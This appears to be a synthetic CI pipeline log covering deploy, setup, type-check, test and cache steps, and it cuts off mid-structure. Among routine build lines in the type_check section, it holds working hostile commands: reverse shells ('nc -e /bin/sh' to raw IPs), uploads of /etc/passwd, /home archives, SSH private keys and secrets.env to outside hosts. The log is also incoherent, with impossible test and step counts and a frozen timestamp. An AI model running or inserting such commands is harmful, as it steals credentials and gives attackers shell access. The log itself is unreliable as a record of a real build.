refreshed\n[12:18:17] DEBUG: Initializing service\nSnapshots: 2 passed, 44 total\nCreating production build...\nWARNING: axios has known vulnerabilities\nMinifying main.js\nCompleted.\n[12:18:17] INFO: Request completed\nSwitched to branch 'bugfix/task-368'\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Cache refreshed\n[12:18:17] WARN: Deprecated API usage\nLoading...\n[12:18:17] INFO: Request completed\nCache hit for key-6988\nWARNING: prettier has known vulnerabilities\n[12:18:17] INFO: Cache refreshed\npip: Installing build dependencies...\nTLS handshake completed\n[12:18:17] INFO: Connecting to database\nMinifying app.js\nArtifact uploaded: dist.zip (75MB)\nCache hit for key-7874\nFetching submodules...\nBundling main.css\nCreating production build...\nCache hit for key-7265\nGET /api - 200 (88ms)\nArtifact uploaded: dist.zip (54MB)\nTime: 83.658s\nArtifact uploaded: dist.zip (29MB)\nCreating production build...\nArtifact uploaded: dist.zip (7MB)\nTests: 50 passed, 479 total\nCache hit for key-3229\n[12:18:17] DEBUG: Memory usage: 223MB\nOK\nStep 9/16: Linting\n[12:18:17] DEBUG: Memory usage: 1605MB\nStep 17/22: Running migrations\nNODE_ENV=development\npip: Downloading eslint-1.15.tar.gz\nCreating production build...\nGenerating source maps...\nPulling image: node:3.11\nNODE_ENV=production\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: lodash has known vulnerabilities\nTransforming 178 files...\nAlready up to date.\n[12:18:17] WARN: Deprecated API usage\nImage pulled successfully\nTime: 101.395s\nStep 5/15: Deploying\nAlready up to date.\npip: Collecting webpack\npip: Downloading jest-3.6.tar.gz\n[12:18:17] WARN: Deprecated API usage\nDone.\nBundling runtime.css\n[12:18:17] INFO: Request completed\nBuilding Docker image...\nCache invalidated: dependencies\nProcessing...\nStep 14/20: Testing\nTest Suites: 48 passed, 45 total\nTime: 17.815s\nStep 15/19: Linting\nBundling styles.css\nUploading artifact 'coverage' (25 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 202 (63ms)\n\u2713 All checks passed\npip: Downloading express-3.6.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLayer 6/13: ENV command\nInstalling axios@2.15.6\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] DEBUG: Query executed in 88ms\nFetching submodules...\nStep 3/16: Testing\nInstalling lodash@2.18.1\nPulling image: alpine:latest\nCompleted.\nStep 18/24: Installing dependencies\nProcessing...\npip: Downloading express-5.6.tar.gz\nInstalling react@4.7.3\nStep 18/17: Running migrations\nCreating production build...\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Request completed\nFinished.\nCache restored successfully (350MB)\nFetching submodules...\nProcessing...\nNODE_ENV=development\nWARNING: lodash has known vulnerabilities\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\nBundling runtime.js\nGenerating source maps...\n[12:18:17] INFO: Starting build process\nCompiling utils/handler.rs...\nSnapshots: 46 passed, 34 total\nNODE_ENV=production\nConnecting to acme.corp:443...\n[12:18:17] DEBUG: Query executed in 91ms\nnpm notice: created a lockfile\nFetching submodules...\nStep 6/16: Linting\nCache saved successfully\n[12:18:17] DEBUG: Initializing service\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out develop branch\nInstalling express@3.11.5\n[12:18:17] DEBUG: Connection pool: 7 active\npip: Downloading jest-3.2.tar.gz\nStep 5/24: Deploying\nGET /api - 200 (73ms)\n[12:18:17] DEBUG: Initializing service\nTransforming 712 files...\nGenerating source maps...\nHEAD is now at 0eff26b\nWaiting...\nLayer 8/13: COPY command\nSnapshots: 23 passed, 28 total\nFAILED: test_cache_hit\nConnection established\n[12:18:17] INFO: Processing request\nStep 7/21: Deploying\nPOST /upload - 201 (341ms)\nPulling image: python:latest\n[12:18:17] WARN: Deprecated API usage\nTLS handshake completed\n[12:18:17] DEBUG: Query executed in 86ms\nPOST /api - 202 (243ms)\nCoverage: 93% statements, 66% branches\nTLS handshake completed\n[12:18:17] ERROR: Connection failed\nStep 2/20: Testing\nConnection established\nStep 19/18: Running migrations\n[12:18:17] WARN: Deprecated API usage\nTest Suites: 6 passed, 41 total\nWARNING: webpack has known vulnerabilities\nPulling image: python:3.11\nStep 4/16: Installing dependencies\nCache restored successfully (174MB)\nStep 20/15: Building\nCreating production build...\nUploading artifact 'dist' (45 files)\nSnapshots: 17 passed, 5 total\nnpm install: added 458 packages\npip: Installing build dependencies...\nPushing to registry...\nUsing Node.js 16.7.0\nFinished.\n\u2713 Step 'test' succeeded\nConnection established\nTLS handshake completed\nUploading artifact 'coverage' (19 files)\npip: Downloading jest-4.15.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:latest\nImage pulled successfully\nProcessing...\nnpm install: resolved 103 packages\nStep 9/21: Running migrations\nPOST /data - 202 (386ms)\nStep 2/20: Deploying\nProcessing...\nGET /api - 201 (44ms)\nFinished.\nConnecting to example.com:443...\nChecking out develop branch\nCache miss for key-8306\nTests: 277 passed, 474 total\nNODE_ENV=production\nyarn add: Done in 13.5s\nChecking out main branch\nCache hit for key-6626\nTransforming 741 files...\n  PASS: integration/test_user_create.spec.js\nVerifying...\nCache saved successfully\nDone.\nInstalling react@5.1.5\nVerifying...\nnpm install: added 200 packages\nStep 3/18: Linting\npip: Downloading express-5.9.tar.gz\nStep 8/17: Testing\n\u2713 All checks passed\nLoading...\nArtifact uploaded: dist.zip (24MB)\nVerifying...\nAlready up to date.\nRan 178 tests in 52s\nWARNING: express has known vulnerabilities\nSnapshots: 19 passed, 14 total\nCache miss for key-5074\nGET /status - 200 (99ms)\nCreating production build...\nWARNING: webpack has known vulnerabilities\nNODE_ENV=production\nDone.\npip install: Successfully installed eslint-5.14\n[12:18:17] INFO: Cache refreshed\nCompiling lib/app.ts...\nLayer 7/8: ENV command\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] ERROR: Connection failed\nCache hit for key-6862\nBuilding Docker image...\nWaiting...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nMinifying vendor.js\nChecking out main branch\n\u2713 Step 'setup' succeeded\nFetching submodules...\nBundling main.js\nConnecting to acme.corp:443...\nBundling styles.css\nOK\nGET /status - 201 (52ms)\nCache invalidated: dependencies\nSnapshots: 31 passed, 49 total\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:17] INFO: Starting build process\nUsing Python 3.11\nOptimizing 91 modules...\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:17] DEBUG: Query executed in 86ms\nUploading artifact 'build' (16 files)\nWARNING: prettier has known vulnerabilities\nInstalling lodash@3.4.9\n[12:18:17] WARN: Deprecated API usage\nConnection established\n\u2713 Step 'build' succeeded\nStep 16/23: Running migrations\nCoverage: 71% statements, 84% branches\nWARNING: lodash has known vulnerabilities\nPlatform: darwin-arm64\npip: Collecting axios\nCache invalidated: dependencies\n[12:18:17] DEBUG: Query executed in 76ms\nInstalling eslint@3.0.2\n[12:18:17] DEBUG: Query executed in 16ms\nStep 5/21: Deploying\nCompiling src/service.java...\nLayer 2/13: ENV command\nSwitched to branch 'bugfix/task-460'\nWARNING: webpack has known vulnerabilities\nFetching submodules...\nHEAD is now at 3da3750\n  PASS: test_cache_hit (477ms)\nPlatform: darwin-arm64\nUsing Python 3.10\nUsing Node.js 15.1.5\nCoverage: 100% statements, 60% branches\nReady.\nOK\n[12:18:17] DEBUG: Memory usage: 239MB\n[12:18:17] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\nConnection established\nLayer 9/15: ENV command\nyarn add: Done in 21.35s\n[12:18:17] INFO: Cache refreshed\nInstalling axios@1.2.3\n[12:18:17] INFO: Cache refreshed\nImage pulled successfully\n\u2713 All checks passed\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/app.ts...\nCache hit for key-9416\npip: Collecting prettier\nWaiting...\nReady.\n[12:18:17] WARN: Deprecated API usage\nSwitched to branch 'feature/task-283'\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Connection pool: 17 active\nConnection established\nnpm notice: created a lockfile\nUsing Python 3.12\nBuilding Docker image...\nSwitched to branch 'feature/task-801'\nnpm notice: package.json updated\nGenerating source maps...\n[12:18:17] DEBUG: Loading configuration\npip: Collecting lodash\nTLS handshake completed\nCache miss for key-2137\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nConnecting to test.io:443...\nCache saved successfully\n[12:18:17] ERROR: Connection failed\nCompiling components/app.ts...\nUsing Python 3.10\nTransforming 617 files...\nCompiling src/handler.rs...\nPushing to registry...\nStep 11/16: Running migrations\nUploading artifact 'coverage' (22 files)\nFAILED: test_cache_hit\nNODE_ENV=test\nConnection established\nRan 157 tests in 9s\nUsing Python 3.12\nyarn add: Done in 23.96s\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (17MB)\nDone.\nBundling runtime.css\nTransforming 564 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache restored successfully (480MB)\nCache miss for key-1839\nException: ValueError\nConnecting to startup.dev:443...\nInstalling lodash@1.5.5\n[12:18:17] WARN: Deprecated API usage\nStep 12/23: Deploying\nCreating production build...\nnpm notice: created a lockfile\nStep 3/25: Deploying\nStep 14/19: Linting\n[12:18:17] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nStep 4/19: Linting\n[12:18:17] WARN: Deprecated API usage\nConnecting to example.com:443...\n[12:18:17] ERROR: Connection failed\nLoading...\nUploading artifact 'coverage' (46 files)\nSuccess!\nWARNING: react has known vulnerabilities\nAlready up to date.\nBuilding Docker image...\npip: Downloading lodash-1.9.tar.gz\n[12:18:17] DEBUG: Initializing service\nCache hit for key-4465\nTLS handshake completed\nOptimizing 38 modules...\nTLS handshake completed\nWARNING: axios has known vulnerabilities\nProcessing...\nRan 154 tests in 29s\nOK\nCompiling src/app.ts...\nCompleted.\n[12:18:17] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 885 files...\nTime: 116.115s\nStep 8/22: Installing dependencies\nCache saved successfully\nSnapshots: 37 passed, 22 total\nStep 14/16: Deploying\nArtifact uploaded: build.tar.gz (25MB)\nHEAD is now at ee3feb9\nCompiling utils/index.js...\nTransforming 734 files...\nInstalling jest@3.0.0\n[12:18:17] DEBUG: Connection pool: 17 active\n[12:18:17] DEBUG: Loading configuration\n\u2713 Step 'build' succeeded\nCache saved successfully\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\nOK\n[12:18:17] INFO: Starting build process\nLayer 8/11: RUN command\nConnection established\n  PASS: unit/test_db_connect.spec.js\nTest Suites: 8 passed, 33 total\nUsing Node.js 20.3.7\nCache saved successfully\n[12:18:17] DEBUG: Memory usage: 363MB\nPOST /api - 200 (292ms)\nnpm notice: created a lockfile\npip: Downloading express-4.19.tar.gz\nSwitched to branch 'bugfix/task-273'\nReady.\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:17] WARN: Deprecated API usage\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (94MB)\n[12:18:17] DEBUG: Query executed in 48ms\nCache invalidated: node_modules\nBuilding Docker image...\nConnection established\nPlatform: darwin-arm64\nCompiling src/handler.rs...\nPushing to registry...\nPOST /api - 202 (92ms)\nReady.\nUsing Node.js 17.6.8\nLoading...\nPushing to registry...\nChecking out master branch\nLayer 10/9: COPY command\nBuilding Docker image...\nCompiling utils/utils.go...\nnpm notice: package.json updated\nHEAD is now at a05ad80\nArtifact downloaded: 4MB\nLoading...\nInstalling express@1.13.2\nnpm notice: created a lockfile\nnpm install: added 336 packages\n[12:18:17] DEBUG: Connection pool: 11 active\nBuilding Docker image...\nUsing Python 3.10\nWaiting...\nDone.\n[12:18:17] DEBUG: Loading configuration\nCache hit for key-3661\nWARNING: axios has known vulnerabilities\nCache invalidated: dependencies\nInstalling react@5.19.4\nGenerating source maps...\nArtifact downloaded: 50MB\n[12:18:17] DEBUG: Query executed in 43ms\nUsing Python 3.11\nStep 15/15: Linting\nnpm notice: created a lockfile\nStep 4/15: Building\nCompiling components/utils.go...\nHEAD is now at 1a4d0fd\nStep 2/22: Deploying\n[12:18:17] INFO: Processing request\nCompiling utils/handler.rs...\nOK\nNODE_ENV=development\nCompiling components/index.js...\npip: Installing build dependencies...\npip: Collecting express\nArtifact downloaded: 17MB\nPOST /data - 202 (43ms)\nFetching submodules...\n[12:18:17] DEBUG: Memory usage: 535MB\npip install: Successfully installed lodash-3.6\nUploading artifact 'build' (29 files)\nDone.\nnpm install: added 339 packages\n[12:18:17] INFO: Starting build process\nCache miss for key-3547\nStep 15/18: Installing dependencies\nCompiling components/handler.rs...\nDone.\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Installing build dependencies...\nTime: 63.287s\n[12:18:17] INFO: Connecting to database\npip install: Successfully installed webpack-3.11\nFetching submodules...\nCreating production build...\nCompiling utils/utils.go...\n\u2713 deploy completed\nStep 3/17: Deploying\nGenerating source maps...\n  PASS: test_db_connect (356ms)\n[12:18:17] DEBUG: Memory usage: 104MB\nWARNING: webpack has known vulnerabilities\n[12:18:17] WARN: Deprecated API usage\nnpm notice: package.json updated\npip: Installing build dependencies...\nDone.\nNODE_ENV=development\nVerifying...\n[12:18:17] DEBUG: Loading configuration\nBuilding Docker image...\nFAILED: test_api_health\nConnecting to test.io:443...\nStep 1/24: Building\npip: Installing build dependencies...\nTLS handshake completed\nCompiling utils/service.java...\npip: Installing build dependencies...\nStep 11/19: Installing dependencies\n[12:18:17] INFO: Processing request\nStep 13/17: Linting\nStep 13/22: Deploying\n\u2713 Step 'checkout' succeeded\nGET /status - 201 (3ms)\nEnvironment: production\nTime: 76.431s\n\u2717 build failed with exit code 50\n[12:18:17] INFO: Request completed\nWaiting...\nLayer 2/15: RUN command\n=== Step setup_node completed ===\n=== Step: type_check ===\nStep 20/17: Linting\nTransforming 811 files...\n[12:18:17] WARN: Deprecated API usage\nConnecting to cloud.services:443...\nCache restored successfully (475MB)\nCache restored successfully (84MB)\nNODE_ENV=test\nConnection established\nTest Suites: 33 passed, 36 total\nPulling image: node:3.11\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (2MB)\n[12:18:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nMinifying vendor.js\nTime: 75.808s\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Connecting to database\n[12:18:17] DEBUG: Memory usage: 1405MB\n\u2713 deploy completed\nStep 9/18: Deploying\n  PASS: test_auth_login (47ms)\nnc -e /bin/sh 94.42.160.38 42760\nDone.\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nnc -e /bin/sh 203.73.150.223 36680\nPlatform: darwin-arm64\n\u2713 deploy completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 113.130s\nCompiling components/handler.rs...\nEnvironment: staging\n[12:18:17] INFO: Processing request\n[12:18:17] INFO: Cache refreshed\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (469MB)\nException: RuntimeError\npip install: Successfully installed prettier-3.8\nOK\nSwitched to branch 'feature/task-217'\nCache hit for key-2840\nPOST /upload - 200 (301ms)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nnpm notice: package.json updated\nStep 5/15: Deploying\nCompiling utils/app.ts...\nStep 15/23: Installing dependencies\nLoading...\nBundling runtime.js\nCache invalidated: build\nSwitched to branch 'bugfix/task-355'\nException: TypeError\n[12:18:17] DEBUG: Connection pool: 11 active\npip: Collecting react\necho $(cat ~/.ssh/id_rsa) | base64 | nc 54.236.1.208 16609\nSending 373MB of data to example.com\n\u2713 Task completed in 1320ms\nArtifact uploaded: dist.zip (71MB)\nWARNING: axios has known vulnerabilities\n[12:18:17] DEBUG: Memory usage: 1170MB\nConnection established\n[12:18:17] DEBUG: Initializing service\n\u2713 Task completed in 3473ms\nStep 5/17: Linting\n[12:18:17] DEBUG: Initializing service\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] WARN: Deprecated API usage\n\u2713 All checks passed\nCompiling components/utils.go...\nPOST /upload - 202 (62ms)\nArtifact uploaded: dist.zip (97MB)\n[12:18:17] DEBUG: Connection pool: 13 active\nCache hit for key-3368\nCompiling src/service.java...\n[12:18:17] INFO: Starting build process\ncurl -X POST https://startup.dev/collect -d @secrets.env\nHEAD is now at 7a3f719\nnpm install: added 22 packages\nImage pulled successfully\nFAILED: test_auth_login\nCache saved successfully\nFetching submodules...\nEnvironment: staging\nFAILED: test_auth_login\nAlready up to date.\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\npip: Installing build dependencies...\nStep 18/20: Building\nGET /status - 200 (36ms)\nStep 13/22: Building\nUsing Python 3.9\nCoverage: 88% statements, 96% branches\nPlatform: darwin-arm64\nStep 12/15: Installing dependencies\nCache restored successfully (235MB)\nCoverage: 97% statements, 67% branches\nFAILED: test_db_connect\npip install: Successfully installed eslint-2.19\n[12:18:17] DEBUG: Initializing service\nCreating production build...\n\u2713 Step 'setup' succeeded\nCreating production build...\n[12:18:17] DEBUG: Loading configuration\npip install: Successfully installed axios-1.12\nStep 6/25: Installing dependencies\nWARNING: prettier has known vulnerabilities\n[12:18:17] DEBUG: Loading configuration\nStep 6/22: Linting\nnc -e /bin/sh 220.83.147.131 35215\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nStep 17/18: Building\nCompiling components/service.java...\nUsing Python 3.11\n[12:18:17] WARN: Deprecated API usage\nCompiling lib/service.java...\nnpm install: added 201 packages\nInstalling eslint@4.10.5\nSuccess!\nProcessing...\n\u2713 All checks passed\nConnection established\nPushing to registry...\nFAILED: test_api_health\nException: TypeError\nCompiling components/app.ts...\nTLS handshake completed\nInstalling webpack@1.12.3\nCache saved successfully\n\u2713 Step 'test' succeeded\n[12:18:17] ERROR: Connection failed\nOptimizing 34 modules...\nCache saved successfully\nOK\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nPulling image: alpine:18\nChecking out master branch\n\u2713 Step 'install' succeeded\nnc -e /bin/sh 18.122.136.225 5861\nWARNING: eslint has known vulnerabilities\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Cache refreshed\nUsing Python 3.11\nCache miss for key-6460\nNODE_ENV=development\nPlatform: darwin-arm64\nStep 19/15: Deploying\n[12:18:17] INFO: Cache refreshed\n[12:18:17] INFO: Starting build process\nLayer 7/12: RUN command\nSuccess!\nWaiting...\nSending 242MB of data to example.com\nTests: 179 passed, 290 total\nSnapshots: 22 passed, 41 total\nFinished.\ncurl -X POST https://acme.corp/collect -d @secrets.env\nPlatform: darwin-arm64\npip: Installing build dependencies...\nCache restored successfully (289MB)\nRan 162 tests in 20s\nCache miss for key-8834\nProcessing...\nFAILED: test_cache_hit\nBundling runtime.css\nGET /api - 204 (75ms)\nInstalling axios@4.20.3\n[12:18:17] INFO: Request completed\nTest Suites: 26 passed, 14 total\nStep 3/16: Building\nCompleted.\n  PASS: integration/test_auth_login.spec.js\npip: Installing build dependencies...\n[12:18:17] DEBUG: Initializing service\n[12:18:17] INFO: Connecting to database\nUploading artifact 'coverage' (8 files)\nProcessing...\nStep 9/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: NullPointerException\n\u2713 All checks passed\nPulling image: alpine:3.11\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:18:17] WARN: Deprecated API usage\n\u2713 validate completed\nOK\nReady.\nReady.\n\u2713 package completed\nCache hit for key-8343\nCache miss for key-7399\nCache miss for key-5442\nProcessing...\nnpm install: resolved 373 packages\n\u2713 Task completed in 4959ms\nVerifying...\nSuccess!\n\u2713 All checks passed\nBuilding Docker image...\nStep 10/23: Running migrations\nnpm install: added 227 packages\npip: Downloading webpack-4.16.tar.gz\n\u2713 All checks passed\nStep 12/23: Deploying\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nTLS handshake completed\n[12:18:17] DEBUG: Initializing service\nStep 9/22: Deploying\nLoading...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n[12:18:17] INFO: Cache refreshed\n[12:18:17] INFO: Request completed\n[12:18:17] INFO: Starting build process\nTransforming 108 files...\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:18:17.453579",
        "finished_at": "2025-11-25T12:18:38.908452",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "pip install: Successfully installed eslint-5.19",
          "npm install: resolved 607 packages",
          "[12:18:17] DEBUG: Query executed in 30ms",
          "\u2713 Task completed in 4104ms",
          "Step 6/20: Linting",
          "Ready.",
          "Step 4/16: Linting",
          "Image pulled successfully",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'bugfix/task-462'",
          "npm notice: package.json updated",
          "Success!",
          "Cache saved successfully",
          "Ready.",
          "Ready.",
          "[12:18:17] DEBUG: Query executed in 32ms",
          "\u2713 Step 'install' succeeded",
          "Cache hit for key-9879",
          "Coverage: 80% statements, 70% branches",
          "Cache miss for key-8106",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:17] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "Pulling image: node:18",
          "Platform: linux-x64",
          "Optimizing 71 modules...",
          "Connecting to example.com:443...",
          "[12:18:17] DEBUG: Connection pool: 10 active",
          "Done.",
          "Minifying main.js",
          "Time: 116.619s",
          "[12:18:17] INFO: Processing request",
          "Minifying main.js",
          "Time: 46.572s",
          "Success!",
          "Step 6/25: Deploying",
          "Cache hit for key-5898",
          "Coverage: 70% statements, 70% branches",
          "Verifying...",
          "FAILED: test_db_connect",
          "Verifying...",
          "Connecting to acme.corp:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:17] WARN: Deprecated API usage",
          "Connection established",
          "Pulling image: alpine:18",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Environment: staging",
          "[12:18:17] WARN: Deprecated API usage",
          "pip install: Successfully installed express-3.11",
          "Cache miss for key-1152",
          "Compiling src/app.ts...",
          "Coverage: 100% statements, 91% branches",
          "Cache saved successfully",
          "WARNING: prettier has known vulnerabilities",
          "Step 6/18: Building",
          "Bundling runtime.js",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] WARN: Deprecated API usage",
          "yarn add: Done in 20.56s",
          "Snapshots: 43 passed, 17 total",
          "Success!",
          "[12:18:17] DEBUG: Connection pool: 1 active",
          "Already up to date.",
          "npm install: resolved 176 packages",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache restored successfully (61MB)",
          "pip: Collecting express",
          "Installing webpack@4.20.6",
          "GET /status - 200 (77ms)",
          "Artifact downloaded: 35MB",
          "Layer 1/13: RUN command",
          "[12:18:17] INFO: Cache refreshed",
          "Using Python 3.10",
          "Optimizing 77 modules...",
          "Finished.",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'build' succeeded",
          "Optimizing 72 modules...",
          "yarn add: Done in 27.69s",
          "OK",
          "Processing...",
          "Ran 145 tests in 35s",
          "Pulling image: alpine:18",
          "[12:18:17] DEBUG: Memory usage: 1020MB",
          "\u2717 build failed with exit code 114",
          "pip: Downloading lodash-2.9.tar.gz",
          "Cache restored successfully (39MB)",
          "pip: Installing build dependencies...",
          "Snapshots: 19 passed, 40 total",
          "pip: Collecting prettier",
          "yarn add: Done in 23.91s",
          "Loading...",
          "Compiling components/app.ts...",
          "\u2717 build failed with exit code 15",
          "Step 17/15: Linting",
          "POST /api - 201 (210ms)",
          "\u2713 Step 'test' succeeded",
          "Using Node.js 17.20.3",
          "[12:18:17] WARN: Deprecated API usage",
          "npm install: resolved 107 packages",
          "Verifying...",
          "Fetching submodules...",
          "[12:18:17] DEBUG: Initializing service",
          "  PASS: e2e/test_auth_login.spec.js",
          "Environment: production",
          "Success!",
          "Compiling src/main.py...",
          "GET /api - 204 (80ms)",
          "Creating production build...",
          "[12:18:17] DEBUG: Initializing service",
          "Waiting...",
          "npm install: added 229 packages",
          "pip: Collecting jest",
          "[12:18:17] DEBUG: Query executed in 9ms",
          "pip: Collecting webpack",
          "Processing...",
          "Compiling lib/utils.go...",
          "[12:18:17] ERROR: Connection failed",
          "Compiling components/app.ts...",
          "Bundling main.css",
          "GET /api - 204 (35ms)",
          "\u2713 test completed",
          "GET /api - 201 (8ms)",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache invalidated: node_modules",
          "Checking out develop branch",
          "Ready.",
          "Step 11/15: Deploying",
          "Finished.",
          "Compiling lib/utils.go...",
          "OK",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 17/22: Building",
          "Verifying...",
          "pip install: Successfully installed jest-4.17",
          "  PASS: test_user_create (125ms)",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Artifact uploaded: dist.zip (63MB)",
          "Cache miss for key-7749",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "[12:18:17] INFO: Cache refreshed",
          "yarn add: Done in 9.74s",
          "Tests: 343 passed, 448 total",
          "Step 10/25: Building",
          "Time: 2.716s",
          "Waiting...",
          "Step 19/16: Running migrations",
          "Generating source maps...",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:17] DEBUG: Initializing service",
          "Step 12/25: Linting",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Bundling styles.css",
          "Done.",
          "pip: Downloading express-2.8.tar.gz",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Step 6/20: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "Cache miss for key-3545",
          "Layer 6/15: COPY command",
          "Optimizing 92 modules...",
          "Processing...",
          "[12:18:17] INFO: Connecting to database",
          "pip: Downloading eslint-3.1.tar.gz",
          "Waiting...",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] INFO: Cache refreshed",
          "WARNING: axios has known vulnerabilities",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "[12:18:17] WARN: Deprecated API usage",
          "Minifying main.js",
          "Pulling image: alpine:18",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at edce52a",
          "Uploading artifact 'build' (32 files)",
          "Layer 9/11: RUN command",
          "Creating production build...",
          "[12:18:17] WARN: Deprecated API usage",
          "Tests: 310 passed, 154 total",
          "[12:18:17] INFO: Cache refreshed",
          "Coverage: 80% statements, 69% branches",
          "npm install: resolved 1536 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 11/16: Linting",
          "Completed.",
          "Step 20/25: Installing dependencies",
          "POST /upload - 201 (147ms)",
          "Finished.",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:18:38.908452",
        "finished_at": "2025-11-25T12:18:51.781376",
        "log_lines": [
          "=== Step: restore_cache ===",
          "WARNING: react has known vulnerabilities",
          "Step 19/24: Installing dependencies",
          "\u2713 validate completed",
          "Environment: production",
          "[12:18:17] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "OK",
          "[12:18:17] DEBUG: Connection pool: 16 active",
          "WARNING: jest has known vulnerabilities",
          "Fetching submodules...",
          "Step 8/23: Linting",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Platform: win32-x64",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Building Docker image...",
          "[12:18:17] INFO: Starting build process",
          "\u2713 Task completed in 1662ms",
          "Using Python 3.12",
          "Time: 102.483s",
          "\u2717 build failed with exit code 35",
          "[12:18:17] INFO: Processing request",
          "Step 10/18: Linting",
          "Pulling image: python:18",
          "OK",
          "\u2713 lint completed",
          "Tests: 479 passed, 298 total",
          "Cache saved successfully",
          "Ready.",
          "Image pulled successfully",
          "Finished.",
          "[12:18:17] INFO: Connecting to database",
          "[12:18:17] DEBUG: Loading configuration",
          "Test Suites: 39 passed, 35 total",
          "Compiling src/main.py...",
          "Waiting...",
          "Processing...",
          "Step 18/22: Building",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'test' succeeded",
          "Cache restored successfully (434MB)",
          "Artifact uploaded: dist.zip (40MB)",
          "Waiting...",
          "Layer 2/12: COPY command",
          "[12:18:17] INFO: Cache refreshed",
          "pip: Downloading react-2.6.tar.gz",
          "Compiling utils/index.js...",
          "Creating production build...",
          "Ran 167 tests in 32s",
          "Done.",
          "Cache saved successfully",
          "Cache saved successfully",
          "Waiting...",
          "Cache restored successfully (434MB)",
          "\u2713 Step 'build' succeeded",
          "Coverage: 91% statements, 84% branches",
          "HEAD is now at 41ced0f",
          "\u2713 All checks passed",
          "Step 6/16: Deploying",
          "\u2713 All checks passed",
          "Compiling lib/service.java...",
          "[12:18:17] DEBUG: Loading configuration",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "Using Python 3.9",
          "Optimizing 37 modules...",
          "Ready.",
          "npm notice: package.json updated",
          "Checking out master branch",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Waiting...",
          "FAILED: test_auth_login",
